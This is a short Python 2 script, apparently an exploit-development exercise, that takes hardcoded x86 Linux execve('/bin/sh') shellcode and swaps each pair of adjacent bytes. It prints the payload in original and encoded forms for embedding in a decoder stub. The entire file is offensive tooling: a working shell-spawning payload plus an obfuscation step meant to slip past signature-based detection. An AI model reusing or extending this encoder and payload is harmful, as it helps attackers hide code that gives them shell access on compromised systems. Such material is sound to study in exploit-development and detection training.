#!/usr/bin/python

#swap encoder

import sys



#if len(sys.argv) != 2:
#	print "Please provide shellcode"
#shellcode = sys.argv[1]


shellcode = ("\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80")

length = len(shellcode)
if length % 2 == 1:
	shellcode += "\x90"


encoded = ""
encoded2 = ""
original = ""
i = 0
a = ''
b = ''


for x in bytearray(shellcode) :
	i = i+1
	if i % 2 == 1:
		a = x
		continue
	b = x

	original += '\\x'
	original += '%02x' % a
        original += '\\x'
        original += '%02x' % b
		

	encoded += '\\x'
        encoded += '%02x' % b
        encoded += '\\x'
        encoded += '%02x' % a

        encoded2 += '0x'
        encoded2 += '%02x,' % b
        encoded2 += '0x'
        encoded2 += '%02x,' % a


print "Original length: {}".format(length)
print "Shellcode ({}):  {}".format(len(original)/4,original)
print "Encoded \\x ({}): {}".format(len(encoded)/4,encoded)
print "Encoded 0x ({}): {}".format(len(encoded2)/5,encoded2)

